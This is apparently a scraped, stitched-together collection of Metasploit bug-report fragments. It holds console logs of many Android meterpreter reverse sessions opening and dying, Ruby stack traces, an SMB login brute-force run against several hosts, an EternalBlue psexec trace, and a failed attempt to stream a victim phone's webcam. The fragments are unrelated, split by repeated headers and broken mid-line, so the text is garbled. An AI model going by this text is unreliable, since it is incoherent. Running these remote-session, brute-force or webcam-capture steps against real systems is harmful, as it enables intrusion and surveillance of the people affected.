[*] meterpreter session 83 opened (127.0.0.1:7777 -> 127.0.0.1:52942) at 2018-06-16 13:16:24 +0530
[*] 127.0.0.1 - meterpreter session 49 closed
reason: died
[*] meterpreter session 84 opened (127.0.0.1:7777 -> 127.0.0.1:52946) at 2018-06-16 13:16:32 +0530
[*] 127.0.0.1 - meterpreter session 50 closed
reason: died
[*] meterpreter session 85 opened (127.0.0.1:7777 -> 127.0.0.1:52950) at 2018-06-16 13:16:34 +0530
[*] 127.0.0.1 - meterpreter session 51 closed
reason: died
[*] 127.0.0.1 - meterpreter session 62 closed
reason: died
[*] meterpreter session 86 opened (127.0.0.1:7777 -> 127.0.0.1:52954) at 2018-06-16 13:16:42 +0530
[*] meterpreter session 87 opened (127.0.0.1:7777 -> 127.0.0.1:52958) at 2018-06-16 13:16:45 +0530
[*] 127.0.0.1 - meterpreter session 52 closed
reason: died
[*] 127.0.0.1 - meterpreter session 53 closed
reason: died
[*] meterpreter session 88 opened (127.0.0.1:7777 -> 127.0.0.1:52962) at 2018-06-16 13:16:53 +0530
[*] meterpreter session 89 opened (127.0.0.1:7777 -> 127.0.0.1:52966) at 2018-06-16 13:16:55 +0530
[*] 127.0.0.1 - meterpreter session 54 closed
reason: died
[*] 127.0.0.1 - meterpreter session 55 closed
reason: died
[*] 127.0.0.1 - meterpreter session 67 closed
reason: died
[*] meterpreter session 90 opened (127.0.0.1:7777 -> 127.0.0.1:52970) at 2018-06-16 13:17:03 +0530
[*] meterpreter session 91 opened (127.0.0.1:7777 -> 127.0.0.1:52974) at 2018-06-16 13:17:05 +0530
[*] 127.0.0.1 - meterpreter session 57 closed
reason: died
[*] meterpreter session 92 opened (127.0.0.1:7777 -> 127.0.0.1:52978) at 2018-06-16 13:17:14 +0530
[*] meterpreter session 93 opened (127.0.0.1:7777 -> 127.0.0.1:52982) at 2018-06-16 13:17:15 +0530
[*] 127.0.0.1 - meterpreter session 58 closed
reason: died
[*] 127.0.0.1 - meterpreter session 70 closed
reason: died
[*] meterpreter session 94 opened (127.0.0.1:7777 -> 127.0.0.1:52986) at 2018-06-16 13:17:24 +0530
[*] meterpreter session 95 opened (127.0.0.1:7777 -> 127.0.0.1:52994) at 2018-06-16 13:17:26 +0530
[*] 127.0.0.1 - meterpreter session 60 closed
reason: died
[*] 127.0.0.1 - meterpreter session 61 closed
reason: died
[*] meterpreter session 96 opened (127.0.0.1:7777 -> 127.0.0.1:52998) at 2018-06-16 13:17:34 +0530
[*] meterpreter session 97 opened (127.0.0.1:7777 -> 127.0.0.1:53002) at 2018-06-16 13:17:36 +0530
interrupt: use the 'exit' command to quit
msf exploit(multi/handler) > sessions -i[*] 127.0.0.1 - meterpreter session 74 closed
reason: died
[*] 127.0.0.1 - meterpreter session 63 closed
reason: died
interrupt: use the 'exit' command to quit
[*] 127.0.0.1 - meterpreter session 75 closed
reason: died
msf exploit(multi/handler) > sessions -i[*] meterpreter session 98 opened (127.0.0.1:7777 -> 127.0.0.1:53006) at 2018-06-16 13:17:45 +0530 active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 64 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52832 (127.0.0.1) 65 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52836 (127.0.0.1) 66 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52840 (127.0.0.1) 68 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52848 (127.0.0.1) 69 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52852 (127.0.0.1) 71 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52884 (127.0.0.1) 72 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52888 (127.0.0.1) 73 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52892 (127.0.0.1) 76 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52904 (127.0.0.1) 77 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52908 (127.0.0.1) 78 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52912 (127.0.0.1) 79 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52916 (127.0.0.1) 80 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52928 (127.0.0.1) 81 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52934 (127.0.0.1) 82 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52938 (127.0.0.1) 83 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52942 (127.0.0.1) 84 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52946 (127.0.0.1) 85 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52950 (127.0.0.1) 86 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52954 (127.0.0.1) 87 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52958 (127.0.0.1) 88 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52962 (127.0.0.1) 89 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52966 (127.0.0.1) 90 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52970 (127.0.0.1) 91 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52974 (127.0.0.1) 92 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52978 (127.0.0.1) 93 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52982 (127.0.0.1) 94 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52986 (127.0.0.1) 95 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52994 (127.0.0.1) 96 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:52998 (127.0.0.1) 97 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:53002 (127.0.0.1) 98 meterpreter java/android 127.0.0.1:7777 -> 127.0.0.1:53006 (127.0.0.1) msf exploit(multi/handler) > [*] meterpreter session 99 opened (127.0.0.1:7777 -> 127.0.0.1:53010) at 2018-06-16 13:17:46 +0530
[*] 127.0.0.1 - meterpreter session 64 closed
reason: died
[*] 127.0.0.1 - meterpreter session 76 closed
reason: died
interrupt: use the 'exit' command to quit
msf exploit(multi/handler) > se[*] 127.0.0.1 - meterpreter session 65 closed
reason: died
ssions[*] 127.0.0.1 - meterpreter session 77 closed
reason: died [*] meterpreter session 100 opened (127.0.0.1:7777 -> 127.0.0.1:53014) at 2018-06-16 13:17:55 +0530
9[*] meterpreter session 101 opened (127.0.0.1:7777 -> 127.0.0.1:53018) at 2018-06-16 13:17:57 +0530
[*] starting interaction with 90..
meterpreter > ? core commands
============= command description ------- ----------- ? help menu background backgrounds the current session bgkill kills a background meterpreter script bglist lists running background scripts bgrun executes a meterpreter script as a background thread channel displays information or control active channels close closes a channel disable_unicode_encoding disables encoding of unicode strings enable_unicode_encoding enables encoding of unicode strings exit terminate the meterpreter session get_timeouts get the current session timeout values guid get the session guid help help menu info displays information about a post module irb drop into irb scripting mode load load one or more meterpreter extensions machine_id get the msf id of the machine attached to the session quit terminate the meterpreter session read reads data from a channel resource run the commands stored in a file run executes a meterpreter script or post module sessions quickly switch to another session set_timeouts set the current session timeout values sleep force meterpreter to go quiet, then re-establish session
transport change the current transport mechanism use deprecated alias for "load" uuid get the uuid for the current session write writes data to a channel meterpreter > [*] 127.0.0.1 - meterpreter session 66 closed
reason: died
[*] 127.0.0.1 - meterpreter session 78 closed
reason: died
bg[*] 127.0.0.1 - meterpreter session 79 closed
reason: died
lis[*] meterpreter session 102 opened (127.0.0.1:7777 -> 127.0.0.1:53022) at 2018-06-16 13:18:05 +0530
meterpreter > [*] meterpreter session 103 opened (127.0.0.1:7777 -> 127.0.0.1:53026) at 2018-06-16 13:18:07 +0530
[*] 127.0.0.1 - meterpreter session 68 closed
reason: died
interrupt: use the 'exit' command to quit
meterpreter > [*] 127.0.0.1 - meterpreter session 80 closed
reason: died
exit[*] 127.0.0.1 - meterpreter session 69 closed
reason: died [*] shutting down meterpreter..
[*] 127.0.0.1 - meterpreter session 90 closed
reason: user exit
msf exploit(multi/handler) > [*] 127.0.0.1 - meterpreter session 81 closed
reason: died
[*] meterpreter session 104 opened (127.0.0.1:7777 -> 127.0.0.1:53030) at 2018-06-16 13:18:17 +0530
[*] meterpreter session 105 opened (127.0.0.1:7777 -> 127.0.0.1:53034) at 2018-06-16 13:18:17 +0530
[*] 127.0.0.1 - meterpreter session 82 closed
reason: died
[*] 127.0.0.1 - meterpreter session 71 closed
reason: died
[*] 127.0.0.1 - meterpreter session 83 closed
reason: died
[*] meterpreter session 106 opened (127.0.0.1:7777 -> 127.0.0.1:53038) at 2018-06-16 13:18:27 +0530
[*] meterpreter session 107 opened (127.0.0.1:7777 -> 127.0.0.1:53042) at 2018-06-16 13:18:28 +0530
[*] 127.0.0.1 - meterpreter session 72 closed
reason: died
[*] 127.0.0.1 - meterpreter session 84 closed
reason: died
[*] 127.0.0.1 - meterpreter session 73 closed
reason: died
[*] 127.0.0.1 - meterpreter session 85 closed
reason: died
[*] meterpreter session 108 opened (127.0.0.1:7777 -> 127.0.0.1:53046) at 2018-06-16 13:18:38 +0530
[*] meterpreter session 109 opened (127.0.0.1:7777 -> 127.0.0.1:53050) at 2018-06-16 13:18:38 +0530
[*] 127.0.0.1 - meterpreter session 86 closed
reason: died
[*] 127.0.0.1 - meterpreter session 87 closed
reason: died
[*] meterpreter session 110 opened (127.0.0.1:7777 -> 127.0.0.1:53054) at 2018-06-16 13:18:48 +0530
[*] meterpreter session 111 opened (127.0.0.1:7777 -> 127.0.0.1:53058) at 2018-06-16 13:18:48 +0530
[*] 127.0.0.1 - meterpreter session 88 closed
reason: died
[*] 127.0.0.1 - meterpreter session 89 closed
reason: died
[*] meterpreter session 112 opened (127.0.0.1:7777 -> 127.0.0.1:53062) at 2018-06-16 13:18:58 +0530
[*] meterpreter session 113 opened (127.0.0.1:7777 -> 127.0.0.1:53066) at 2018-06-16 13:18:58 +0530
[*] 127.0.0.1 - meterpreter session 91 closed
reason: died
[*] meterpreter session 114 opened (127.0.0.1:7777 -> 127.0.0.1:53070) at 2018-06-16 13:19:09 +0530
[*] meterpreter session 115 opened (127.0.0.1:7777 -> 127.0.0.1:53074) at 2018-06-16 13:19:10 +0530
[*] 127.0.0.1 - meterpreter session 92 closed
reason: died
[*] 127.0.0.1 - meterpreter session 93 closed
reason: died
[*] meterpreter session 116 opened (127.0.0.1:7777 -> 127.0.0.1:53080) at 2018-06-16 13:19:22 +0530
[*] meterpreter session 117 opened (127.0.0.1:7777 -> 127.0.0.1:53086) at 2018-06-16 13:19:24 +0530
[*] 127.0.0.1 - meterpreter session 94 closed
reason: died
[*] 127.0.0.1 - meterpreter session 95 closed
reason: died
[*] meterpreter session 118 opened (127.0.0.1:7777 -> 127.0.0.1:53124) at 2018-06-16 13:19:29 +0530
[*] meterpreter session 119 opened (127.0.0.1:7777 -> 127.0.0.1:53128) at 2018-06-16 13:19:30 +0530
[*] 127.0.0.1 - meterpreter session 96 closed
reason: died
[*] 127.0.0.1 - meterpreter session 97 closed
reason: died
[*] meterpreter session 120 opened (127.0.0.1:7777 -> 127.0.0.1:53132) at 2018-06-16 13:19:40 +0530
[*] meterpreter session 121 opened (127.0.0.1:7777 -> 127.0.0.1:53136) at 2018-06-16 13:19:41 +0530
[*] 127.0.0.1 - meterpreter session 98 closed
reason: died
[*] 127.0.0.1 - meterpreter session 99 closed
reason: died
[*] meterpreter session 122 opened (127.0.0.1:7777 -> 127.0.0.1:53140) at 2018-06-16 13:19:50 +0530
[*] meterpreter session 123 opened (127.0.0.1:7777 -> 127.0.0.1:53144) at 2018-06-16 13:19:50 +0530
[*] 127.0.0.1 - meterpreter session 100 closed
reason: died
[*] 127.0.0.1 - meterpreter session 101 closed
reason: died
[*] meterpreter session 124 opened (127.0.0.1:7777 -> 127.0.0.1:53148) at 2018-06-16 13:20:00 +0530
[*] meterpreter session 125 opened (127.0.0.1:7777 -> 127.0.0.1:53152) at 2018-06-16 13:20:01 +0530
[*] 127.0.0.1 - meterpreter session 102 closed
reason: died
[*] 127.0.0.1 - meterpreter session 103 closed
reason: died
[*] meterpreter session 126 opened (127.0.0.1:7777 -> 127.0.0.1:53186) at 2018-06-16 13:20:11 +0530
[*] meterpreter session 127 opened (127.0.0.1:7777 -> 127.0.0.1:53188) at 2018-06-16 13:20:12 +0530
[*] 127.0.0.1 - meterpreter session 104 closed
reason: died
[*] 127.0.0.1 - meterpreter session 105 closed
reason: died
[*] meterpreter session 128 opened (127.0.0.1:7777 -> 127.0.0.1:53192) at 2018-06-16 13:20:21 +0530
[*] meterpreter session 129 opened (127.0.0.1:7777 -> 127.0.0.1:53196) at 2018-06-16 13:20:21 +0530
[*] 127.0.0.1 - meterpreter session 106 closed
reason: died
[*] 127.0.0.1 - meterpreter session 107 closed
reason: died
[*] meterpreter session 130 opened (127.0.0.1:7777 -> 127.0.0.1:53200) at 2018-06-16 13:20:31 +0530
[*] meterpreter session 131 opened (127.0.0.1:7777 -> 127.0.0.1:53204) at 2018-06-16 13:20:32 +0530
[*] 127.0.0.1 - meterpreter session 108 closed
reason: died
[*] 127.0.0.1 - meterpreter session 109 closed
reason: died
[*] meterpreter session 132 opened (127.0.0.1:7777 -> 127.0.0.1:53210) at 2018-06-16 13:20:41 +0530
[*] meterpreter session 133 opened (127.0.0.1:7777 -> 127.0.0.1:53214) at 2018-06-16 13:20:42 +0530
[*] 127.0.0.1 - meterpreter session 110 closed
reason: died
[*] 127.0.0.1 - meterpreter session 111 closed
reason: died
[*] meterpreter session 134 opened (127.0.0.1:7777 -> 127.0.0.1:53284) at 2018-06-16 13:20:52 +0530
[*] meterpreter session 135 opened (127.0.0.1:7777 -> 127.0.0.1:53288) at 2018-06-16 13:20:52 +0530
[*] 127.0.0.1 - meterpreter session 112 closed
reason: died
[*] 127.0.0.1 - meterpreter session 113 closed
reason: died
[*] meterpreter session 136 opened (127.0.0.1:7777 -> 127.0.0.1:53292) at 2018-06-16 13:21:02 +0530
[*] meterpreter session 137 opened (127.0.0.1:7777 -> 127.0.0.1:53296) at 2018-06-16 13:21:02 +0530
[*] 127.0.0.1 - meterpreter session 114 closed
reason: died
[*] meterpreter session 138 opened (127.0.0.1:7777 -> 127.0.0.1:53300) at 2018-06-16 13:21:12 +0530
[*] meterpreter session 139 opened (127.0.0.1:7777 -> 127.0.0.1:53304) at 2018-06-16 13:21:13 +0530
[*] 127.0.0.1 - meterpreter session 115 closed
reason: died
[*] 127.0.0.1 - meterpreter session 116 closed
reason: died
[*] meterpreter session 140 opened (127.0.0.1:7777 -> 127.0.0.1:53308) at 2018-06-16 13:21:23 +0530
[*] meterpreter session 141 opened (127.0.0.1:7777 -> 127.0.0.1:53312) at 2018-06-16 13:21:23 +0530
[*] 127.0.0.1 - meterpreter session 117 closed
reason: died
[*] 127.0.0.1 - meterpreter session 118 closed
reason: died
[*] 127.0.0.1 - meterpreter session 119 closed
reason: died
[*] meterpreter session 142 opened (127.0.0.1:7777 -> 127.0.0.1:53316) at 2018-06-16 13:21:33 +0530
[*] meterpreter session 143 opened (127.0.0.1:7777 -> 127.0.0.1:53320) at 2018-06-16 13:21:33 +0530
[*] 127.0.0.1 - meterpreter session 120 closed
reason: died
[*] 127.0.0.1 - meterpreter session 121 closed
reason: died kali linux 2018.2 msf 4.16.61-dev ### i installed metasploit with:
- [ ] kali package via apt
kali 2018.2
#<thread: @/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 17: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' 16: from /usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn' 15: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:121:in `block in monitor_rsock' 14: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:121:in `loop' 13: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:188:in `block (2 levels) in monitor_rsock' 12: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:90:in `close_write' 11: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:106:in `shutdown' 10: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_request' 9: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:248:in `send_packet_wait_response' 8: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:181:in `send_packet' 7: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:823:in `to_r' 6: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:823:in `call' 5: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:595:in `to_r' 4: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:453:in `each' 3: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:453:in `each' 2: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:596:in `block in to_r' 1: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:323:in `to_r'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:323:in `pack': no implicit conversion of nil into integer (typeerror)```
``` ## system stuff
1) exploit runs successfully
2) payload executes successfully
3) handler cannot connect to a bind named pipe "msf-pipe" cause it get status_pipe_not_available i\'ve captured network traffic and it might be helpful: ## system stuff
[*] 10.10.66.1:445 - 10.10.66.1:445 - starting smb login bruteforce
[*] 10.10.66.5:445 - 10.10.66.5:445 - starting smb login bruteforce
[*] 10.10.66.3:445 - 10.10.66.3:445 - starting smb login bruteforce
[*] 10.10.66.2:445 - 10.10.66.2:445 - starting smb login bruteforce
[*] 10.10.66.4:445 - 10.10.66.4:445 - starting smb login bruteforce
[*] 10.10.66.1:445 - 10.10.66.1:445 - this system does not accept authentication with any credentials, proceeding with brute force
#<thread: @/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 17: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' 16: from /usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn' 15: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:121:in `block in monitor_rsock' 14: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:121:in `loop' 13: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/io/socket_abstraction.rb:188:in `block (2 levels) in monitor_rsock' 12: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:90:in `close_write' 11: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/net/socket_subsystem/tcp_client_channel.rb:106:in `shutdown' 10: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_request' 9: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:248:in `send_packet_wait_response' 8: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:181:in `send_packet' 7: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:823:in `to_r' 6: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:823:in `call' 5: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:595:in `to_r' 4: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:453:in `each' 3: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:453:in `each' 2: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:596:in `block in to_r' 1: from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:323:in `to_r'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:323:in `pack': no implicit conversion of nil into integer (typeerror)
``` ## system stuff
[-] warning! the following modules could not be loaded!
[-] e:/msf-tools/metasploit-framework/embedded/framework/modules/auxiliary/dos/smb/smb_loris.rb: msf::modules::error failed to load module (dos/smb/smb_loris from e:/msf-tools/metasploit-framework/embedded/framework/modules/auxiliary/dos/smb/smb_loris.rb) due to invalid module (no metasploitmodule class or module name)
``` you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
msf5 exploit(multi/handler) > history 1 use exploit/multi/handler
msf5 exploit(multi/handler) > pry [1] pry(#<msf::modules::mod6578706c6f69742f6d756c74692f68616e646c6572::metasploitmodule>)> exit msf5 exploit(multi/handler) > history
1 use exploit/multi/handler
3 pry 4 puts a 5 n 6 next
8 p hostname
16 pry.commands.alias_command 'n', 'next'
18 p @login
msf5 exploit(multi/handler) >
msf5 exploit(multi/handler) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 shell cmd/unix \x1b]0;sun@sun: ~_sun@sun:~$ 127.0.0.1:4444 -> 127.0.0.1:52230 (127.0.0.1) ``` ## system stuff
does not connect to host though a route has been added and is able to connect with other modules
[06/03/2018 07:10:51] [w(0)] core: monitor_rsock: the remote socket is nil, exiting loop
ssl connect fails with the following:
`[-] exploit failed [unreachable]: openssl::ssl::sslerror ssl_connect returned=1 errno=0 state=sslv2/v3 read server hello a: unknown protocol` from `~/.msf4/logs/framework.log`:
[06/02/2018 13:18:07] [e(0)] core: exploit failed (multi/http/mediawiki_syntaxhighlight): openssl::ssl::sslerror ssl_connect returned=1 errno=0 state=sslv2/v3 read server hello a: unknown protocol
[06/02/2018 13:18:07] [d(3)] core: call stack:
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/ssl_tcp.rb:156:in `connect'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/ssl_tcp.rb:156:in `block in initsock_with_ssl_version'
/opt/metasploit-framework/embedded/lib/ruby/2.4.0/timeout.rb:93:in `block in timeout'
/opt/metasploit-framework/embedded/lib/ruby/2.4.0/timeout.rb:33:in `block in catch'
/opt/metasploit-framework/embedded/lib/ruby/2.4.0/timeout.rb:33:in `catch'
/opt/metasploit-framework/embedded/lib/ruby/2.4.0/timeout.rb:33:in `catch'
/opt/metasploit-framework/embedded/lib/ruby/2.4.0/timeout.rb:108:in `timeout'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/ssl_tcp.rb:154:in `initsock_with_ssl_version'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/ssl_tcp.rb:98:in `initsock'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/comm/local.rb:328:in `create_by_type'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/comm/local.rb:33:in `create'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket.rb:49:in `create_param'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:37:in `create_param'
/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:28:in `create'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:177:in `connect'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:244:in `send_request'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:229:in `_send_recv'
/opt/metasploit-framework/embedded/framework/lib/rex/proto/http/client.rb:210:in `send_recv'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/http/client.rb:357:in `send_request_cgi'
/opt/metasploit-framework/embedded/framework/modules/exploits/multi/http/mediawiki_syntaxhighlight.rb:53:in `check'
/opt/metasploit-framework/embedded/framework/modules/exploits/multi/http/mediawiki_syntaxhighlight.rb:133:in `exploit'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit_driver.rb:206:in `job_run_proc'
/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit_driver.rb:167:in `run'
/opt/metasploit-framework/embedded/framework/lib/msf/base/simple/exploit.rb:137:in `exploit_simple'
/opt/metasploit-framework/embedded/framework/lib/msf/base/simple/exploit.rb:162:in `exploit_simple'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/exploit.rb:110:in `cmd_exploit'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:208:in `run'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:49:in `<main>'
## system stuff
- no tab completion
after manually specifying `set rhosts [ip address]` and then running the module it appears to be working as normal
- rhosts does not appear in the `show options` output ## system stuff
`linux kali 4.15.0-kali3-amd64 #1 smp debian 4.15.17-1kali1 (2018-04-25) x86_64 gnu/linux`
msf auxiliary(scanner/http/trace) > run [+] e.f.g.h:80 is vulnerable to cross-site tracing
#<thread: @/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 3: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' 2: from /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run' 1: from /usr/share/metasploit-framework/modules/auxiliary/scanner/http/trace.rb:47:in `run_host'
/usr/share/metasploit-framework/lib/msf/core/auxiliary/report.rb:287:in `report_vuln': undefined method `id' for nil:nilclass (nomethoderror)
[-] auxiliary failed: nomethoderror undefined method `id' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/report.rb:287:in `report_vuln'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/http/trace.rb:47:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
``` you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
the binary seems to fail to connect back to the listener and windows 10 remains still
## system stuff
**attacker machine**
kali linux 2018.2 kernal 4.15.17 **victim machine**
win 10 v1709 and v1803
:disappointed: can't get rid of this issue :disappointed:
all vulns/servcies/hosts are returned
## system stuff
but meterpreter > webcam_stream 2
[*] starting...
[*] preparing player...
[*] opening player at: yedzhbwp.html
[*] streaming...
[-] error running command webcam_stream: rex::timeouterror operation timed out
this happens meterpreter > sysinfo
computer : localhost
os : android 7.0 - linux 3.10.84-ga9160e1 (armv7l)
meterpreter : dalvik/android callog,sysinfo,getuid etc commands are working
but other failed due to timeout ## system stuff msf exploit(multi/handler) > version
framework: 4.16.52-dev-a1027d56c947f83c61f4345a5551e939bb0bfb5c
console : 4.16.52-dev-a1027d56c947f83c61f4345a5551e939bb0bfb5c using ngrok for connecting
### i installed metasploit with:
windows installer ### os what os are you running metasploit on?
[-] 192.168.69.128:445 - nomethoderror
[-] 192.168.69.128:445 - undefined method `socket' for nil:nilclass
[-] 192.168.69.128:445 - /users/asoto/git/r7/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:591:in `create'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket.rb:49:in `create_param'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:37:in `create_param'
/users/asoto/.rbenv/versions/2.4.3/lib/ruby/gems/2.4.0/gems/rex-socket-0.1.14/lib/rex/socket/tcp.rb:28:in `create'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/exploit/tcp.rb:102:in `connect'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/exploit/smb/client.rb:85:in `connect'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/exploit/smb/client/psexec_ms17_010.rb:27:in `eternal_pwn'
/users/asoto/git/r7/metasploit-framework/modules/exploits/windows/smb/ms17_010_psexec.rb:99:in `exploit'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/exploit_driver.rb:206:in `job_run_proc'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/exploit_driver.rb:167:in `run'
/users/asoto/git/r7/metasploit-framework/lib/msf/base/simple/exploit.rb:136:in `exploit_simple'
